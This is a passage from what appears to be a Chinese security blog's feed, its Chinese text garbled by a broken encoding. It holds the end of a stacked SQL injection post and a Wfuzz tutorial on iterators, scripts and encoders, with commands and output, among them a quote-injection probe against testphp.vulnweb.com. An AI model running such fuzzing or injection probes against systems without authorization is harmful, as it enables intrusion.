&lt;p&gt;ğŸ’åˆ—å‡ºè¡¨å&lt;/p&gt;

&lt;p&gt;ğŸ’åˆ—å‡ºåˆ—å&lt;/p&gt;

&lt;p&gt;ğŸ’æƒ³åŠæ³•è¯»æ•°æ®ï¼Œè¿™é‡Œçš„æ“ä½œæ˜¯å…³é”®è¯ç»•è¿‡&lt;/p&gt;

&lt;h1 id=&quot;refer&quot;&gt;Refer&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;www.wuliao.com&quot;&gt;https://xz.aliyun.com/t/5505&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;www.shibushisha.com&quot;&gt;https://www.zhaoj.in/read-5873.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;www.hahahaha.com&quot;&gt;https://www.cnblogs.com/0nth3way/articles/7128189.html&lt;/a&gt;&lt;/p&gt;</content><author><name>true</name></author><category term="SQLæ³¨å…¥" /><summary type="html">å †å æ³¨å…¥ğŸ¤’</summary></entry><entry><title type="html">Wfuzzçš„å…¶ä»–æ¨¡å—</title><link href="http://localhost:4000/blog/wfuzz1/" rel="alternate" type="text/html" title="Wfuzzçš„å…¶ä»–æ¨¡å—" /><published>2020-04-02T17:08:36+08:00</published><updated>2020-04-02T17:08:36+08:00</updated><id>http://localhost:4000/blog/wfuzz1</id><content type="html" xml:base="http://localhost:4000/blog/wfuzz1/">&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#è¿­ä»£å™¨iterators&quot; id=&quot;markdown-toc-è¿­ä»£å™¨iterators&quot;&gt;è¿­ä»£å™¨(iterators)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#è„šæœ¬scripts&quot; id=&quot;markdown-toc-è„šæœ¬scripts&quot;&gt;è„šæœ¬(scripts)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#åŠ å¯†encoders&quot; id=&quot;markdown-toc-åŠ å¯†encoders&quot;&gt;åŠ å¯†(encoders)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ğŸ¤ºåŸºç¡€ç”¨æ³•è¯·çœ‹ä¸Šä¸€ç¯‡&lt;/p&gt;

&lt;p&gt;ğŸ¤º&lt;a href=&quot;https://wfuzz.readthedocs.io/en/latest/&quot;&gt;è¯¥é¡¹ç›®çš„å®˜ç½‘æ‰‹å†Œ&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ğŸ¤ºKali Linuxè‡ªå¸¦æ­¤å·¥å…·&lt;/p&gt;

&lt;p&gt;ğŸ¤ºä¸Šä¸€ç¯‡å†™äº†ç®€å•ä»‹ç»å’Œ&lt;code class=&quot;highlighter-rouge&quot;&gt;payloads&lt;/code&gt;æ¨¡å—çš„ç”¨æ³•ï¼Œè¿™é‡Œä»‹ç»å…¶ä»–ä¸‰ä¸ªä¸»è¦æ¨¡å—&lt;code class=&quot;highlighter-rouge&quot;&gt;iterators&lt;/code&gt;ã€&lt;code class=&quot;highlighter-rouge&quot;&gt;scripts&lt;/code&gt;ã€&lt;code class=&quot;highlighter-rouge&quot;&gt;encoders&lt;/code&gt;&lt;/p&gt;

&lt;h1 id=&quot;è¿­ä»£å™¨iterators&quot;&gt;è¿­ä»£å™¨(iterators)&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;å…·ä½“è¯´æ˜&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -e iterators

Available iterators:

  Name    | Summary                                                                       
-----------------------------------------------------------------------------------------
  chain   | Returns an iterator returns elements from the first iterable until it is  
          | exhausted, then proceeds to the next iterable, until all of the iterables are 
          | exhausted.                                                                   
  product | Returns an iterator cartesian product of input iterables.                     
  zip     | Returns an iterator that aggregates elements from each of the iterables. 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;iterators&lt;/code&gt;è‡ªå¸¦ä¸‰ä¸ªè¿­ä»£å™¨ï¼Œ&lt;code class=&quot;highlighter-rouge&quot;&gt;-m xxx&lt;/code&gt;ä½¿ç”¨è¿­ä»£å™¨&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;chain&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;éœ€è¦ä¸¤ä¸ªå­—å…¸ï¼Œä¸€ä¸ªå ä½ç¬¦FUZZï¼Œ&lt;code class=&quot;highlighter-rouge&quot;&gt;chain&lt;/code&gt;å¯ä»¥æ•´åˆä¸¤ä¸ªå­—å…¸ä¸ºä¸€ä¸ªï¼Œä¼ å…¥å ä½ç¬¦ï¼Œä¸€å…±&lt;code class=&quot;highlighter-rouge&quot;&gt;n+m&lt;/code&gt;æ¡payloads&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -z range,0-10 -w Deutsch.txt -m chain http://172.16.70.163/FUZZ

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://172.16.70.163/FUZZ
Total requests: 17

===================================================================
ID           Response   Lines    Word     Chars       Payload                                     
===================================================================

000000002:   404        828 L    1806 W   36851 Ch    &quot;1&quot;                                         
000000003:   404        828 L    1806 W   36850 Ch    &quot;2&quot;                                         
000000004:   404        828 L    1806 W   36849 Ch    &quot;3&quot;                                         
000000005:   404        828 L    1806 W   36850 Ch    &quot;4&quot;                                         
000000006:   404        828 L    1806 W   36850 Ch    &quot;5&quot;                                         
000000007:   404        828 L    1806 W   36850 Ch    &quot;6&quot;                                         
000000008:   404        828 L    1806 W   36850 Ch    &quot;7&quot;                                         
000000001:   200        213 L    495 W    7870 Ch     &quot;0&quot;                                         
000000009:   404        828 L    1806 W   36850 Ch    &quot;8&quot;                                         
000000010:   404        828 L    1806 W   36850 Ch    &quot;9&quot;                                         
000000013:   404        828 L    1806 W   36886 Ch    &quot;Milch&quot;                                     
000000014:   404        828 L    1806 W   36886 Ch    &quot;Apfel&quot;                                     
000000017:   404        828 L    1806 W   36895 Ch    &quot;Schule&quot;                                    
000000011:   404        828 L    1806 W   36859 Ch    &quot;10&quot;                                        
000000012:   404        828 L    1806 W   36877 Ch    &quot;Heft&quot;                                      
000000015:   404        828 L    1806 W   36976 Ch    &quot;Schweinefleisch&quot;                           
000000016:   404        828 L    1806 W   36895 Ch    &quot;Kamera&quot;                                    

Total time: 0.215062
Processed Requests: 17
Filtered Requests: 0
Requests/sec.: 79.04683
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;product&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;éœ€è¦ä¸¤ä¸ªå­—å…¸ï¼Œä¸¤ä¸ªå ä½ç¬¦FUZZå’ŒFUZ2Zï¼Œ&lt;code class=&quot;highlighter-rouge&quot;&gt;product&lt;/code&gt;å¯ä»¥æ’åˆ—ç»„åˆä¸¤ä¸ªå­—å…¸ï¼ŒæŒ‰é¡ºåºä¼ å…¥å ä½ç¬¦ï¼Œä¸€å…±&lt;code class=&quot;highlighter-rouge&quot;&gt;n*m&lt;/code&gt;æ¡payloads&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -z range,0-3 -w Deutsch.txt -m product http://172.16.70.163/FUZZ=FUZ2Z

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://172.16.70.163/FUZZ=FUZ2Z
Total requests: 16

===================================================================
ID           Response   Lines    Word     Chars       Payload                                     
===================================================================

000000001:   404        828 L    1807 W   36895 Ch    &quot;0 - Heft&quot;                                  
000000002:   404        828 L    1807 W   36904 Ch    &quot;0 - Milch&quot;                                 
000000003:   404        828 L    1807 W   36902 Ch    &quot;0 - Apfel&quot;                                 
000000004:   404        828 L    1807 W   36993 Ch    &quot;0 - Schweinefleisch&quot;                       
000000005:   404        828 L    1807 W   36894 Ch    &quot;1 - Heft&quot;                                  
000000006:   404        828 L    1807 W   36903 Ch    &quot;1 - Milch&quot;                                 
000000007:   404        828 L    1807 W   36903 Ch    &quot;1 - Apfel&quot;                                 
000000008:   404        828 L    1807 W   36994 Ch    &quot;1 - Schweinefleisch&quot;                       
000000009:   404        828 L    1807 W   36894 Ch    &quot;2 - Heft&quot;                                  
000000010:   404        828 L    1807 W   36903 Ch    &quot;2 - Milch&quot;                                 
000000011:   404        828 L    1807 W   36903 Ch    &quot;2 - Apfel&quot;                                 
000000012:   404        828 L    1807 W   36993 Ch    &quot;2 - Schweinefleisch&quot;                       
000000013:   404        828 L    1807 W   36894 Ch    &quot;3 - Heft&quot;                                  
000000014:   404        828 L    1807 W   36904 Ch    &quot;3 - Milch&quot;                                 
000000015:   404        828 L    1807 W   36903 Ch    &quot;3 - Apfel&quot;                                 
000000016:   404        828 L    1807 W   36994 Ch    &quot;3 - Schweinefleisch&quot;                       

Total time: 0.207002
Processed Requests: 16
Filtered Requests: 0
Requests/sec.: 77.29370
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;zip&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;éœ€è¦ä¸¤ä¸ªå­—å…¸ï¼Œä¸¤ä¸ªä¸ªå ä½ç¬¦FUZZå’ŒFUZ2Zï¼Œ&lt;code class=&quot;highlighter-rouge&quot;&gt;zip&lt;/code&gt;å¯ä»¥ä¸¤ä¸ªå­—å…¸ä¸€ä¸€å¯¹åº”ï¼ŒæŒ‰é¡ºåºä¼ å…¥ä¸¤ä¸ªå ä½ç¬¦ï¼Œå¦‚æœä¸¤ä¸ªå­—å…¸è¡Œæ•°ä¸ç›¸ç­‰åˆ™å–è¡Œæ•°å°‘çš„ï¼Œæ‰€ä»¥ä¸€å…±&lt;code class=&quot;highlighter-rouge&quot;&gt;min(n,m)&lt;/code&gt;æ¡payloads&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -z range,0-10 -w Deutsch.txt -m zip http://172.16.70.163/FUZZ=FUZ2Z

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://172.16.70.163/FUZZ=FUZ2Z
Total requests: 6

===================================================================
ID           Response   Lines    Word     Chars       Payload                                     
===================================================================

000000001:   404        828 L    1807 W   36895 Ch    &quot;0 - Heft&quot;                                  
000000003:   404        828 L    1807 W   36903 Ch    &quot;2 - Apfel&quot;                                 
000000002:   404        828 L    1807 W   36904 Ch    &quot;1 - Milch&quot;                                 
000000004:   404        828 L    1807 W   36993 Ch    &quot;3 - Schweinefleisch&quot;                       
000000005:   404        828 L    1807 W   36912 Ch    &quot;4 - Kamera&quot;                                
000000006:   404        828 L    1807 W   36911 Ch    &quot;5 - Schule&quot;                                

Total time: 0.238128
Processed Requests: 6
Filtered Requests: 0
Requests/sec.: 25.19648
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å…¶å®å°±å¾ˆåƒBurpsuiteé‡Œé¢çš„Intruderæ¨¡å—ï¼Œç›®å‰æ„Ÿè§‰è¿˜æ˜¯Intruderå¥½ç”¨&lt;/p&gt;

&lt;h1 id=&quot;è„šæœ¬scripts&quot;&gt;è„šæœ¬(scripts)&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;å…·ä½“è¯´æ˜&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -e scripts

Available scripts:

  Category                      | Name          | Summary                                              
-------------------------------------------------------------------------------------------------------
  default, active, discovery    | cvs_extractor | Parses CVS/Entries file.                             
  default, passive              | errors        | Looks for error messages                             
  default, active, discovery    | wc_extractor  | Parses subversion's wc.db file.                      
  active, discovery             | links         | Parses HTML looking for new content.                 
  re-enqueue, active, discovery | backups       | Looks for known backup filenames.                    
  default, passive              | listing       | Looks for directory listing vulnerabilities          
  default, active, discovery    | svn_extractor | Parses .svn/entries file.                            
  verbose, passive              | headers       | Looks for server headers                             
  default, active, discovery    | sitemap       | Parses sitemap.xml file                              
  verbose, passive              | cookies       | Looks for new cookies                                
  verbose, passive              | title         | Parses HTML page title                               
  tools                         | grep          | HTTP response grep                                   
  default, active, discovery    | robots        | Parses robots.txt looking for new content.           
  tools, active                 | screenshot    | Performs a screen capture using linux cutycapt tool
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;åˆ†ç±»è¯´æ˜&lt;/strong&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;å‚æ•°&lt;/th&gt;
      &lt;th&gt;è¯´æ˜&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;passive&lt;/td&gt;
      &lt;td&gt;è¢«åŠ¨è„šæœ¬åˆ†æç°æœ‰è¯·æ±‚å’Œå“åº”ï¼Œè€Œæ— éœ€æ‰§è¡Œæ–°è¯·æ±‚&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;active&lt;/td&gt;
      &lt;td&gt;ä¸»åŠ¨è„šæœ¬å¯¹åº”ç”¨ç¨‹åºæ‰§è¡Œæ–°è¯·æ±‚ä»¥æ¢æµ‹å…¶æ¼æ´&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;discovery&lt;/td&gt;
      &lt;td&gt;é€šè¿‡è‡ªåŠ¨å°†å‘ç°çš„å†…å®¹æ’å…¥wfuzzè¯·æ±‚çš„èµ„æºæ± ï¼Œæ¥å¸®åŠ©æŠ“å–ç½‘ç«™&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;strong&gt;ä½¿ç”¨Scripts&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;å¯ä»¥å…ˆæŸ¥çœ‹ä¸€ä¸‹æŸä¸ªæ¨¡å—çš„ä¿¡æ¯&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz --script-help=backups

Name: backups 0.1
Categories: re-enqueue,active,discovery
Summary: Looks for known backup filenames.
Author: Xavi Mendez (@xmendez)
Description:
   Looks for known backup filenames.
Parameters:
   - ext (= .bak,.tgz,.zip,.tar.gz,~,.rar,.old,.-.swp): Extensions to look for.

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;ä½¿ç”¨scripts&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;ä½¿ç”¨&lt;code class=&quot;highlighter-rouge&quot;&gt;backup&lt;/code&gt;è„šæœ¬æ¨¡å—ï¼Œ&lt;code class=&quot;highlighter-rouge&quot;&gt;backups.txt&lt;/code&gt;ä¸ºå­—å…¸&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz --script=backups -w backups.txt http://172.16.70.163/FUZZ

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://172.16.70.163/FUZZ
Total requests: 7

===================================================================
ID           Response   Lines    Word     Chars       Payload                                            
===================================================================

000000004:   404        828 L    1806 W   36850 Ch    &quot;4&quot;                                                
000000001:   404        828 L    1806 W   36850 Ch    &quot;1&quot;                                                
000000002:   404        828 L    1806 W   36850 Ch    &quot;2&quot;                                                
000000003:   404        828 L    1806 W   36849 Ch    &quot;3&quot;                                                
000000006:   404        828 L    1806 W   36868 Ch    &quot;saf&quot;                                              
000000005:   404        828 L    1806 W   36859 Ch    &quot;ad&quot;                                               
000000007:   404        828 L    1806 W   36868 Ch    &quot;zxs&quot;                                              

Total time: 1.044162
Processed Requests: 7
Filtered Requests: 0
Requests/sec.: 6.703940
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä¸ºäº†ä¸å†é‡å¤æ‰«æç›¸åŒçš„è¯·æ±‚ï¼ˆå…·æœ‰ç›¸åŒçš„å‚æ•°ï¼‰ï¼Œæœ‰ä¸€ä¸ªç¼“å­˜ï¼Œå¯ä»¥ä½¿ç”¨â€“no-cacheæ ‡å¿—ç¦ç”¨ç¼“å­˜&lt;/p&gt;

&lt;p&gt;ä¾‹å¦‚ï¼Œå¦‚æœæˆ‘ä»¬ä»¥å…·æœ‰ç›¸åŒURLä½†å‚æ•°å€¼ä¸åŒçš„WebæœåŠ¡å™¨ä¸ºç›®æ ‡ï¼Œåˆ™ä¼šå¾—åˆ°&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -z range --zD 0-3 -z list --zD &quot;'&quot; -u http://testphp.vulnweb.com/artists.php?artist=FUZZFUZ2Z -A

000000004:   0.195s       200        101 L    287 W    3986 Ch     nginx/1.4.1   &quot;3 - '&quot;
|_  Error identified: Warning: mysql_fetch_array()
000000001:   0.198s       200        101 L    287 W    3986 Ch     nginx/1.4.1   &quot;0 - '&quot;
000000002:   0.198s       200        101 L    287 W    3986 Ch     nginx/1.4.1   &quot;1 - '&quot;
000000003:   0.198s       200        101 L    287 W    3986 Ch     nginx/1.4.1   &quot;2 - '&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç›¸åŒæ“ä½œï¼Œç¦ç”¨äº†ç¼“å­˜&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -z range --zD 0-3 -z list --zD &quot;'&quot; -u http://testphp.vulnweb.com/artists.php?artist=FUZZFUZ2Z -A --no-cache

000000004:   1.170s       200        101 L    287 W    3986 Ch     nginx/1.4.1   &quot;3 - '&quot;
|_  Error identified: Warning: mysql_fetch_array()
000000002:   1.173s       200        101 L    287 W    3986 Ch     nginx/1.4.1   &quot;1 - '&quot;
|_  Error identified: Warning: mysql_fetch_array()
000000001:   1.174s       200        101 L    287 W    3986 Ch     nginx/1.4.1   &quot;0 - '&quot;
|_  Error identified: Warning: mysql_fetch_array()
000000003:   1.173s       200        101 L    287 W    3986 Ch     nginx/1.4.1   &quot;2 - '&quot;
|_  Error identified: Warning: mysql_fetch_array()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;è‡ªå®šä¹‰è„šæœ¬&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;å¦‚æœè¦åˆ›å»ºè„šæœ¬ï¼Œéœ€è¦åœ¨â€œ .wfuzzâ€ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåä¸ºâ€œ scriptsâ€çš„ç›®å½•ï¼Œå°†è„šæœ¬æ”¾å…¥ç›®å½•ä¸‹&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/xmendez/wfuzz/tree/master/src/wfuzz/plugins/scripts&quot;&gt;å‚è€ƒå¦‚ä½•ç¼–å†™æ’ä»¶&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;åŠ å¯†encoders&quot;&gt;åŠ å¯†(encoders)&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;å…·ä½“è¯´æ˜&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -e encoders

Available encoders:

  Category      | Name              | Summary                                                                           
-----------------------------------------------------------------------------------------
  hashes        | base64            | Encodes the given string using base64                                             
  url           | doble_nibble_hex  | Replaces ALL characters in string using the %%dd%dd escape                        
  url_safe, url | double urlencode  | Applies a double encode to special characters in string using the %25xx escape.   
                |                   | Letters, digits, and the characters '_.-' are never quoted.                       
  url           | first_nibble_hex  | Replaces ALL characters in string using the %%dd? escape                          
  default       | hexlify           | Every byte of data is converted into the corresponding 2-digit hex representatio  
                |                   | n.                                                                                
  html          | html_decimal      | Replaces ALL characters in string using the &amp;amp;#dd; escape                          
  html          | html_escape       | Convert the characters &amp;amp;&amp;lt;&amp;gt;&quot; in string to HTML-safe sequences.                     
  html          | html_hexadecimal  | Replaces ALL characters in string using the &amp;amp;#xx; escape                          
  hashes        | md5               | Applies a md5 hash to the given string                                            
  db            | mssql_char        | Converts ALL characters to MsSQL's char(xx)                                       
  db            | mysql_char        | Converts ALL characters to MySQL's char(xx)                                       
  default       | none              | Returns string without changes                                                    
  db            | oracle_char       | Converts ALL characters to Oracle's chr(xx)                                       
  default       | random_upper      | Replaces random characters in string with its capitals letters                    
  url           | second_nibble_hex | Replaces ALL characters in string using the %?%dd escape                          
  hashes        | sha1              | Applies a sha1 hash to the given string                                           
  url           | uri_double_hex    | Encodes ALL charachers using the %25xx escape.                                    
  url           | uri_hex           | Encodes ALL charachers using the %xx escape.                                      
  url           | uri_triple_hex    | Encodes ALL charachers using the %25%xx%xx escape.                                
  url           | uri_unicode       | Replaces ALL characters in string using the %u00xx escape                         
  url_safe, url | urlencode         | Replace special characters in string using the %xx escape. Letters, digits, and   
                |                   | the characters '_.-' are never quoted.                                            
  url           | utf8              | Replaces ALL characters in string using the \u00xx escape                         
  url           | utf8_binary       | Replaces ALL characters in string using the \uxx escape
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;encoders&lt;/code&gt;çš„ä½œç”¨æ˜¯å°†payloadè¿›è¡Œç¼–ç æˆ–åŠ å¯†&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ä½¿ç”¨æ–¹æ³•&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;åœ¨å­—å…¸åé¢ç›´æ¥åŠ åŠ å¯†æ–¹å¼å°±å¯ä»¥äº†&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -w wordlist.txt,md5 http://172.16.70.163/FUZZ

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://172.16.70.163/FUZZ
Total requests: 7

===================================================================
ID           Response   Lines    Word     Chars       Payload                                            
===================================================================

000000001:   404        828 L    1810 W   37237 Ch    &quot;c4ca4238a0b923820dcc509a6f75849b&quot;                 
000000002:   404        828 L    1810 W   37237 Ch    &quot;c81e728d9d4c2f636f067f89cc14862c&quot;                 
000000003:   404        828 L    1810 W   37237 Ch    &quot;eccbc87e4b5ce2fe28308fd9f2a7baf3&quot;                 
000000004:   404        828 L    1810 W   37237 Ch    &quot;a87ff679a2f3e71d9181a67b7542122c&quot;                 
000000005:   404        828 L    1810 W   37237 Ch    &quot;523af537946b79c4f8369ed39ba78605&quot;                 
000000006:   404        828 L    1810 W   37237 Ch    &quot;e8a88bb6f4d420a8517965d25cd54a14&quot;                 
000000007:   404        828 L    1810 W   37237 Ch    &quot;68f43f44054de89e6ee5ff03adb26542&quot;                 

Total time: 0.239509
Processed Requests: 7
Filtered Requests: 0
Requests/sec.: 29.22638
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;ä½¿ç”¨å¤šä¸ªencoder&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;å¤šä¸ªencoderï¼Œä½¿ç”¨ä¸€ä¸ª&lt;code class=&quot;highlighter-rouge&quot;&gt;-&lt;/code&gt;å·åˆ†éš”çš„åˆ—è¡¨æ¥æŒ‡å®š&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz -w wordlist.txt,md5-base64 http://172.16.70.163/FUZZ

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://172.16.70.163/FUZZ
Total requests: 14

===================================================================
ID           Response   Lines    Word     Chars       Payload                                            
===================================================================

000000001:   404        828 L    1810 W   37237 Ch    &quot;c4ca4238a0b923820dcc509a6f75849b&quot;                 
000000002:   404        828 L    1807 W   36876 Ch    &quot;MQ==&quot;                                             
000000003:   404        828 L    1810 W   37237 Ch    &quot;c81e728d9d4c2f636f067f89cc14862c&quot;                 
000000004:   404        828 L    1807 W   36876 Ch    &quot;Mg==&quot;                                             
000000005:   404        828 L    1810 W   37237 Ch    &quot;eccbc87e4b5ce2fe28308fd9f2a7baf3&quot;                 
000000006:   404        828 L    1807 W   36876 Ch    &quot;Mw==&quot;                                             
000000007:   404        828 L    1810 W   37237 Ch    &quot;a87ff679a2f3e71d9181a67b7542122c&quot;                 
000000008:   404        828 L    1807 W   36876 Ch    &quot;NA==&quot;                                             
000000009:   404        828 L    1810 W   37237 Ch    &quot;523af537946b79c4f8369ed39ba78605&quot;                 
000000013:   404        828 L    1810 W   37237 Ch    &quot;68f43f44054de89e6ee5ff03adb26542&quot;                 
000000010:   404        828 L    1806 W   36876 Ch    &quot;YWQ=&quot;                                             
000000011:   404        828 L    1810 W   37236 Ch    &quot;e8a88bb6f4d420a8517965d25cd54a14&quot;                 
000000012:   404        828 L    1806 W   36877 Ch    &quot;c2Fm&quot;                                             
000000014:   404        828 L    1806 W   36877 Ch    &quot;enhz&quot;                                             

Total time: 0.266457
Processed Requests: 14
Filtered Requests: 0
Requests/sec.: 52.54129
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;å¤šæ¬¡encoder&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;å¤šæ¬¡encoderï¼Œä½¿ç”¨ä¸€ä¸ª&lt;code class=&quot;highlighter-rouge&quot;&gt;@&lt;/code&gt;å·åˆ†éš”çš„åˆ—è¡¨æ¥æŒ‡å®šï¼Œé¡ºåºä¸ºç”±å³åˆ°å·¦&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -w wordlist.txt,md5@base64 http://172.16.70.163/FUZZ

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/shodanp.py Exception, msg=No module named 'shodan'
libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/bing.py Exception, msg=No module named 'shodan'
********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://172.16.70.163/FUZZ
Total requests: 7

===================================================================
ID           Response   Lines    Word     Chars       Payload                                            
===================================================================

000000003:   404        828 L    1810 W   37237 Ch    &quot;0b24df25fe628797b3a50ae0724d2730&quot;                 
000000006:   404        828 L    1810 W   37237 Ch    &quot;461194a350fdac0ef28e8b2073f34a6a&quot;                 
000000001:   404        828 L    1810 W   37237 Ch    &quot;cdd96d3cc73d1dbdaffa03cc6cd7339b&quot;                 
000000002:   404        828 L    1810 W   37235 Ch    &quot;0b7e7dee87b1c3b98e72131173dfbbbf&quot;                 
000000004:   404        828 L    1810 W   37237 Ch    &quot;f7947d50da7a043693a592b4db43b0a1&quot;                 
000000005:   404        828 L    1810 W   37237 Ch    &quot;5fae8a76529cf25432da8e49f1053e08&quot;                 
000000007:   404        828 L    1810 W   37237 Ch    &quot;4094c4aed3ced5fbd69159b16af12b7b&quot;                 

Total time: 1.048273
Processed Requests: 7
Filtered Requests: 0
Requests/sec.: 6.677649
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>true</name></author><category term="fuzz" /><summary type="html">ğŸ¤ºåŸºç¡€ç”¨æ³•è¯·çœ‹ä¸Šä¸€ç¯‡</summary></entry><entry><title type="html">fuzzç¬¬ä¸€æ­¥ï¼ŒWfuzzæ¥æŒ‡è·¯</title><link href="http://localhost:4000/blog/wfuzz0/" rel="alternate" type="text/html" title="fuzzç¬¬ä¸€æ­¥ï¼ŒWfuzzæ¥æŒ‡è·¯" /><published>2020-03-31T15:13:21+08:00</published><updated>2020-03-31T15:13:21+08:00</updated><id>http://localhost:4000/blog/wfuzz0</id><content type="html" xml:base="http://localhost:4000/blog/wfuzz0/">&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#è¯´æ˜ä¹¦&quot; id=&quot;markdown-toc-è¯´æ˜ä¹¦&quot;&gt;è¯´æ˜ä¹¦&lt;/a&gt;&lt;/li&gt;
